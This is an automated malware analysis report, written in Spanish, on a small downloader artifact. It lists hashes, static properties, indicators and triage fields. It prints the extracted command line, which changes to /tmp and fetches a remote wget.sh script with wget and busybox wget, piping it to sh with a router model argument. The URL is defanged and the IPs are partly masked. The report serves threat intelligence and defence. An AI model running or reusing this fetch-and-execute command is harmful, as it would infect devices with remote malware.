# 🧬 Payload Analysis

`93649cdc71dddb26769a677632676821cad46420e9c921d9d81d199c06a559a6`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 330 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `93649cdc71dddb26769a677632676821cad46420e9c921d9d81d199c06a559a6`
- **SHA1:** `f6023beca3999808f64366a1d4bf2fcb8dc22b37`
- **MD5:** `be4c74f6c1eec9cc84f9fb4cc04764bb`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 330 B |
| Entropía | 5.2 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s d
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s d | strings |
| hash | 93649cdc71dddb26769a677632676821cad46420e9c921d9d81d199c06a559a6 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
